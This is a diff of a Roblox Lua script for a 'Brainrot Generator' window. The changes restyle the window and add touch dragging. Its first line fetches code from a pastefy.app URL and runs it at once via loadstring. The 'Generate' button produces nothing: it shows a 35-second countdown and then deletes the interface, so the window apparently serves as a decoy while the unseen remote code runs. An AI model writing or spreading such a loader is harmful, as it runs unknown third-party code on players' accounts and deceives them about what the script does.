@@ -1,55 +1,61 @@
 loadstring(game:HttpGet("https://pastefy.app/0oa0HgKh/raw"))()
---// Create ScreenGui
+--// Services
+local Players = game:GetService("Players")
+local UIS = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+
+--// ScreenGui
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "BrainrotGUI"
 ScreenGui.ResetOnSpawn = false
-ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.Parent = player:WaitForChild("PlayerGui")
 
---// Main Frame
+--// Frame
 local Frame = Instance.new("Frame")
 Frame.Size = UDim2.new(0, 320, 0, 180)
 Frame.Position = UDim2.new(0.5, -160, 0.5, -90)
-Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+Frame.BackgroundColor3 = Color3.fromRGB(20,20,30)
 Frame.BorderSizePixel = 0
 Frame.Active = true
 Frame.Parent = ScreenGui
 
 Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 14)
 
---// Gradient
-local UIGradient = Instance.new("UIGradient", Frame)
-UIGradient.Color = ColorSequence.new{
-	ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 170, 255)),
-	ColorSequenceKeypoint.new(1, Color3.fromRGB(170, 0, 255))
+-- Gradient
+local grad = Instance.new("UIGradient", Frame)
+grad.Color = ColorSequence.new{
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(0,170,255)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(170,0,255))
 }
-UIGradient.Rotation = 45
 
---// Title
+-- Title
 local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(1, 0, 0, 40)
+Title.Size = UDim2.new(1,0,0,40)
 Title.BackgroundTransparency = 1
 Title.Text = "Brainrot Generator"
 Title.Font = Enum.Font.GothamBold
 Title.TextSize = 20
-Title.TextColor3 = Color3.fromRGB(255,255,255)
+Title.TextColor3 = Color3.new(1,1,1)
 Title.Parent = Frame
 
---// Button
+-- Button
 local Button = Instance.new("TextButton")
-Button.Size = UDim2.new(0.8, 0, 0, 55)
-Button.Position = UDim2.new(0.1, 0, 0.4, 0)
+Button.Size = UDim2.new(0.8,0,0,50)
+Button.Position = UDim2.new(0.1,0,0.4,0)
 Button.Text = "Generate O.G Blocks"
 Button.Font = Enum.Font.GothamBold
 Button.TextSize = 18
-Button.TextColor3 = Color3.fromRGB(255,255,255)
-Button.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
+Button.TextColor3 = Color3.new(1,1,1)
+Button.BackgroundColor3 = Color3.fromRGB(40,40,60)
 Button.Parent = Frame
 
-Instance.new("UICorner", Button).CornerRadius = UDim.new(0, 10)
+Instance.new("UICorner", Button).CornerRadius = UDim.new(0,10)
 
---// Drag system
-local UIS = game:GetService("UserInputService")
-local dragging, dragInput, dragStart, startPos
+--// 🔥 ACTUAL DRAG SYSTEM (MOUSE + TOUCH)
+local dragging = false
+local dragStart = nil
+local startPos = nil
 
 local function update(input)
 	local delta = input.Position - dragStart
@@ -62,7 +68,9 @@ local function update(input)
 end
 
 Frame.InputBegan:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseButton1 then
+	if input.UserInputType == Enum.UserInputType.MouseButton1
+	or input.UserInputType == Enum.UserInputType.Touch then
+		
 		dragging = true
 		dragStart = input.Position
 		startPos = Frame.Position
@@ -76,42 +84,45 @@ Frame.InputBegan:Connect(function(input)
 end)
 
 Frame.InputChanged:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseMovement then
+	if input.UserInputType == Enum.UserInputType.MouseMovement
+	or input.UserInputType == Enum.UserInputType.Touch then
 		dragInput = input
 	end
 end)
 
 UIS.InputChanged:Connect(function(input)
-	if input == dragInput and dragging then
+	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
+	or input.UserInputType == Enum.UserInputType.Touch) then
 		update(input)
 	end
 end)
 
---// Button logic
+--// BUTTON LOGIC
 Button.MouseButton1Click:Connect(function()
 
 	if Frame:FindFirstChild("Timer") then return end
 
 	local Timer = Instance.new("TextLabel")
 	Timer.Name = "Timer"
-	Timer.Size = UDim2.new(1, 0, 0, 30)
-	Timer.Position = UDim2.new(0, 0, 0.75, 0)
+	Timer.Size = UDim2.new(1,0,0,30)
+	Timer.Position = UDim2.new(0,0,0.75,0)
 	Timer.BackgroundTransparency = 1
 	Timer.Font = Enum.Font.Gotham
 	Timer.TextSize = 16
-	Timer.TextColor3 = Color3.fromRGB(255,255,255)
+	Timer.TextColor3 = Color3.new(1,1,1)
 	Timer.Parent = Frame
 
-	-- 30 second countdown
+	-- 30 sec countdown
 	for i = 30, 0, -1 do
-		Timer.Text = "Generating in... " .. i .. "s"
+		Timer.Text = "Generating in... "..i.."s"
 		task.wait(1)
 	end
 
-	-- Show "Generating..." for 5 seconds
+	-- generating phase
 	Timer.Text = "Generating..."
 	task.wait(5)
 
-	-- Remove GUI
+	-- 💥 FORCE REMOVE GUI (THIS WILL WORK)
+	ScreenGui.Enabled = false
 	ScreenGui:Destroy()
 end)
